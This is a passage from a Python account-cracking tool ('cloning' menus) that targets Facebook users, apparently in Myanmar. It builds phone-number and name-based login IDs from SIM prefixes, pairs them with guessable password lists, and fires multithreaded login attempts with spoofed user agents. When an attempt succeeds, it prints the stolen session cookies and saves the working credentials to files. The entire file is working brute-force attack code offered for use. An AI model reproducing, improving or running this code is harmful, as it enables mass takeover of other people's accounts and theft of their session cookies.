    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen3.append(uaku)
def main():
    os.system('clear')
    print(logo)
    print(f"\033[1;31m[\033[1;96m1\033[1;31m] \033[1;32mMETHOD \033[1;91m(1)")   
    print(f"\033[1;31m[\033[1;96m2\033[1;31m] \033[1;32mMETHOD \033[1;91m(2)")   
    print(f"\033[1;31m[\033[1;96m3\033[1;31m] \033[1;32mMETHOD \033[1;91m(3)")   
    print(f"\033[1;31m[\033[1;96m0\033[1;31m] \033[1;31mEXIT")
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    M = input(f'\033[1;32m[•] YOUR CHOICE : ')
    if M in ["1"]:
        M1()
    if M in ["2"]:
        M2()
    if M in ["3"]:
        M3()
    if M in ["0"]:
        os.system('exit')    
    

def M1():
    os.system('clear')
    print(logo)
    print(f"\033[1;31m[\033[1;96m1\033[1;31m] \033[1;32mRANDOM CLONING")   
    print(f"\033[1;31m[\033[1;96m2\033[1;31m] \033[1;32mGMAIL CLONING \033[1;36m(digitx 2)")   
    print(f"\033[1;31m[\033[1;96m3\033[1;31m] \033[1;32mGMAIL CLONING \033[1;36m(digitx 3)")   
    print(f"\033[1;31m[\033[1;96m4\033[1;31m] \033[1;32mGMAIL CLONING \033[1;36m(digitx 4)")   
    print(f"\033[1;31m[\033[1;96m5\033[1;31m] \033[1;32mUSER NAME CLONING ")   
    print(f"\033[1;31m[\033[1;96m0\033[1;31m] \033[1;31mEXIT")
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    K = input(f'\033[1;32m[•] YOUR CHOICE : ')
    if K in ["1"]:
        K1()
    if K in ["2"]:
        K2()
    if K in ["3"]:
        K3()
    if K in ["4"]:
        K4()
    if K in ["5"]:
        K5()
    if K in ["0"]:
        os.system('exit')
        
def K1():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mATOM CODE      - \033[1;32m799 789 779 769 759')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mMPT CODE       - \033[1;32m429 419 409 259 269')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mOOREDOO CODE   - \033[1;32m989 979 969 959 949')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mMYTEL CODE     - \033[1;32m699 689 679 669 659')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    code = input('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32m SIM CODE : ')
    os.system('clear')
    print(logo)
    print('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32mCLONING LIMIT= 2000•5000•10000•15000•50000')
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    limit = int(input('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32mYOUR CLONING LIMIT : '))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE CODE  : \033[1;32m'+code+'             ')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for love in user:
            uid = '09'+code+love
            pwx = [uid,love,code+love,code+love[:3],'myanmar','myanmar123','Myanmar','Myanmar123']
            morshed.submit(rcrack,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     

def K2():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : @gmail.com , @yahoo.com')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    domain=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR DOMAIN : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,3))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+''+last+'.xx'+domain+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+last[0:1]+'.'+digitx+domain,first+last+'.'+digitx+domain,first[1:]+last[1:]+'.'+digitx+domain,last+first[0:1]+'.'+digitx+domain])
            pwx= [digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     
    
def K3():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : @gmail.com , @yahoo.com')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    domain=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR DOMAIN : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+''+last+'.xxx'+domain+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+last[0:1]+'.'+digitx+domain,first+last+'.'+digitx+domain,first[1:]+last[1:]+'.'+digitx+domain,last+first[0:1]+'.'+digitx+domain])
            pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     
    
def K4():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : @gmail.com , @yahoo.com')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    domain=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR DOMAIN : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,5))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+''+last+'.xxxx'+domain+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+last[0:1]+'.'+digitx+domain,first+last+'.'+digitx+domain,first[1:]+last[1:]+'.'+digitx+domain,last+first[0:1]+'.'+digitx+domain])
            pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     
    
def K5():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+'.'+last+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+'.'+last[0:1]+'.'+digitx,first+'.'+last+'.'+digitx,first[1:]+'.'+last[1:]+'.'+digitx])
            pwx = ['u'+first+last,'mg'+first+last,'ko'+first+last,'daw'+first+last,'ma'+first+last,'oo'+first+last,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',first+last+'12345',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     


def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    try:
        for ps in pwx:
            pro = random.choice(ugen1)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
            lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[MKL-OK] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;36m'+coki+'\033[0;97m')
                print('\033[1;34m  >>>-----------------------------------------------➤')
                cek_apk(session,coki)
                open('/sdcard/MKL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                print('\r\r\33[1;31m[MKL-CP] ' +uid+ ' | ' +ps+'')
                open('/sdcard/MKL-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s[MKL-M1]-[%s]-[%s]-[OK]-[%s]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
        
def M2():
    os.system('clear')
    print(logo)
    print(f"\033[1;31m[\033[1;96m1\033[1;31m] \033[1;32mRANDOM CLONING")   
    print(f"\033[1;31m[\033[1;96m2\033[1;31m] \033[1;32mGMAIL CLONING \033[1;36m(digitx 2)")   
    print(f"\033[1;31m[\033[1;96m3\033[1;31m] \033[1;32mGMAIL CLONING \033[1;36m(digitx 3)")   
    print(f"\033[1;31m[\033[1;96m4\033[1;31m] \033[1;32mGMAIL CLONING \033[1;36m(digitx 4)")   
    print(f"\033[1;31m[\033[1;96m5\033[1;31m] \033[1;32mUSER NAME CLONING")   
    print(f"\033[1;31m[\033[1;96m0\033[1;31m] \033[1;31mEXIT")
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    L = input(f'\033[1;32m[•] YOUR CHOICE : ')
    if L in ["1"]:
        L1()
    if L in ["2"]:
        L2()
    if L in ["3"]:
        L3()
    if L in ["4"]:
        L4()
    if L in ["5"]:
        L5()
    if L in ["0"]:
        os.system('exit')
        
def L1():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mATOM CODE      - \033[1;32m799 789 779 769 759')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mMPT CODE       - \033[1;32m429 419 409 259 269')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mOOREDOO CODE   - \033[1;32m989 979 969 959 949')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mMYTEL CODE     - \033[1;32m699 689 679 669 659')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    code = input('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32m SIM CODE : ')
    os.system('clear')
    print(logo)
    print('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32mCLONING LIMIT= 2000•5000•10000•15000•50000')
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    limit = int(input('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32mYOUR CLONING LIMIT : '))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE CODE  : \033[1;32m'+code+'             ')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for love in user:
            uid = '09'+code+love
            pwx = [uid,love,code+love,code+love[:3],'myanmar','myanmar123','Myanmar','Myanmar123']
            morshed.submit(rcrack1,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     

def L2():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : @gmail.com , @yahoo.com')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    domain=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR DOMAIN : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,3))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
